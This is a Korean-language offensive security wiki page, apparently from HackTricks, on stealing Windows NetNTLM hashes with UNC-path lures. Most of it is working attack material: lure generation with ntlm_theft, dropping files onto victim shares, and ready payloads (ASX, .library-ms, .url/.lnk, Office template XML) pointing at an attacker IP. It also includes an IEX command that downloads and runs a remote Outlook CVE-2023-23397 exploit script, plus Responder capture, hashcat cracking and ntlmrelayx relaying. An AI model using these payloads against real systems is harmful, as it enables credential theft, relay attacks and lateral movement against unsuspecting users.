# NTLM creds를 훔칠 수 있는 장소

{{#include ../../banners/hacktricks-training.md}}

**microsoft word 파일의 다운로드부터 ntlm leak source까지 NetNTLM hashes를 훔치는 데서의 흥미로운 아이디어는 모두 확인해보세요: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md, 그리고 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

사용자가 **Explorer에서 탐색하는 share에 write할 수 있다면**, 메타데이터가 당신의 UNC를 가리키는 파일들(예: `\\ATTACKER\share`)을 넣으세요. 폴더를 렌더링하면 **implicit SMB authentication**이 트리거되고 **NetNTLMv2**가 리스너로 leak됩니다.

1. **lures 생성** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. 포함)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **쓰기 가능한 공유 폴더에 drop them** (피해자가 여는 모든 폴더):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows는 여러 파일에 동시에 접근할 수 있습니다. Explorer가 미리보기하는 것(`BROWSE TO FOLDER`)은 클릭이 필요 없습니다.

### Windows Media Player playlists (.ASX/.WAX)

대상이 당신이 제어하는 Windows Media Player playlist를 열거나 미리보게 할 수 있다면, 항목을 UNC path로 지정해 Net‑NTLMv2를 leak할 수 있습니다. WMP는 참조된 media를 SMB를 통해 가져오려고 시도하며, 자동으로 authenticate합니다.

예시 payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Collection 및 cracking flow:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer는 ZIP archive 안에서 직접 열리는 .library-ms files를 insecure하게 처리합니다. library definition이 remote UNC path(예: \\attacker\share)를 가리키면, ZIP 내부의 .library-ms를 단순히 browsing/launching 하는 것만으로 Explorer가 UNC를 enumerate하고 attacker에게 NTLM authentication을 emit합니다. 이로 인해 offline으로 crack하거나, 경우에 따라 relay할 수 있는 NetNTLMv2가 생성됩니다.

attacker UNC를 가리키는 최소 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- 위의 XML로 .library-ms 파일을 생성하세요(IP/hostname 설정).
- 그것을 zip 하세요(Windows: Send to → Compressed (zipped) folder) 그리고 ZIP을 target에 전달하세요.
- NTLM capture listener를 실행하고 victim이 ZIP 안의 .library-ms를 열 때까지 기다리세요.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows는 calendar items에서 확장 MAPI property PidLidReminderFileParameter를 처리했습니다. 그 property가 UNC path(예: \\attacker\share\alert.wav)를 가리키면, reminder가 울릴 때 Outlook은 SMB share에 접속하여 사용자의 Net‑NTLMv2를 어떤 click도 없이 leak했습니다. 이 문제는 2023년 3월 14일에 patched 되었지만, legacy/untouched fleets와 historical incident response에서는 여전히 매우 중요합니다.

PowerShell(Outlook COM)로 빠르게 exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
리스너 측:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- 피해자는 reminder가 트리거될 때 Outlook for Windows만 실행 중이면 된다.
- leak은 offline cracking 또는 relay에 적합한 Net‑NTLMv2를 생성한다 (pass‑the‑hash는 아님).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Windows Explorer는 shortcut icon을 자동으로 렌더링한다. 최근 연구에 따르면 Microsoft의 2025년 4월 UNC-icon shortcut 패치 이후에도, shortcut target을 UNC path에 호스팅하고 icon을 local로 유지하면 클릭 없이도 NTLM authentication을 트리거할 수 있었다 (patch bypass는 CVE-2025-50154로 지정됨). 폴더를 보기만 해도 Explorer가 remote target에서 metadata를 가져오며, attacker SMB server로 NTLM을 전송한다.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- 바로가기를 ZIP에 넣고 피해자가 그것을 탐색하도록 유도합니다.
- 피해자가 열 수 있는 writable share에 바로가기를 둡니다.
- 같은 폴더에 있는 다른 lure 파일들과 결합해 Explorer가 항목을 미리 보게 합니다.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows는 실행 시뿐만 아니라 **view/preview** 중에도 `.lnk` 메타데이터를 로드합니다(아이콘 렌더링). CVE‑2026‑25185는 **ExtraData** 블록이 shell로 하여금 icon path를 해석하고 로드 **during load** 중 filesystem을 건드리게 하는 parsing path를 보여주며, 경로가 remote일 경우 outbound NTLM을 발생시킵니다.

Key trigger conditions (`CShellLink::_LoadFromStream`에서 관찰됨):
- ExtraData에 **DARWIN_PROPS** (`0xa0000006`)를 포함합니다(icon update routine로 가는 gate).
- **TargetUnicode**가 채워진 **ICON_ENVIRONMENT_PROPS** (`0xa0000007`)를 포함합니다.
- loader는 `TargetUnicode`의 environment variables를 확장하고, 결과 path에 대해 `PathFileExistsW`를 호출합니다.

`TargetUnicode`가 UNC path(예: `\\attacker\share\icon.ico`)로 resolve되면, **단순히 shortcut이 들어 있는 folder를 보는 것만으로도** outbound authentication이 발생합니다. 같은 load path는 **indexing**과 **AV scanning**에서도 실행될 수 있어, 실용적인 no-click leak surface가 됩니다.

Research tooling(parser/generator/UI)은 Windows GUI를 사용하지 않고도 이러한 구조를 만들고 검사할 수 있도록 **LnkMeMaybe** project에서 제공됩니다.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Native **WebDAV client**는 현재 logon session이 임의의 **HTTP/WebDAV** endpoint에 authenticate하도록 강제하는 데 악용될 수 있습니다:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
왜 이것이 유용한가:
- **공격자가 제어하는 WebDAV 서버**에 대해, custom client를 따로 배포하지 않고도 **HTTP를 통한 NTLM**을 트리거할 수 있다.
- **내부 호스트**에 대해서는, lateral movement 전에 **도난당한 credentials가 어디에서 허용되는지** 조용하게 검증하는 방법이다.
- **SMB egress가 필터링**되어 있지만 **HTTP/WebDAV**는 여전히 접근 가능할 때 좋은 대안이다.

운영 메모:
- **WebClient** 서비스가 source host에서 실행 중이어야 한다.
- `rundll32.exe`는 `davclnt.dll`을 로드하고 Windows가 **현재 사용자 credentials**를 사용해 WebDAV authentication을 처리하게 만든다.
- 직접 제어하는 infrastructure를 가리키게 한다면, 다음과 같은 NTLM-aware HTTP listener/relay를 사용하라:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
탐지 관점에서, 여러 내부 시스템을 대상으로 반복되는 `rundll32.exe davclnt.dll,DavSetCookie` 실행은 정상 사용자 행위라기보다 **credential validation / spray-like lateral movement prep**의 강한 신호입니다.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 문서는 외부 template를 참조할 수 있습니다. attached template를 UNC path로 설정하면, 문서를 열 때 SMB로 authenticate합니다.

Minimal DOCX relationship changes (inside word/):

1) word/settings.xml를 편집하고 attached template reference를 추가합니다:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels를 편집하고 rId1337을 your UNC로 지정하세요:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx로 repack하고 전달합니다. SMB capture listener를 실행하고 open을 기다리세요.

relaying 또는 NTLM abuse에 대한 post-capture 아이디어는 다음을 확인하세요:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
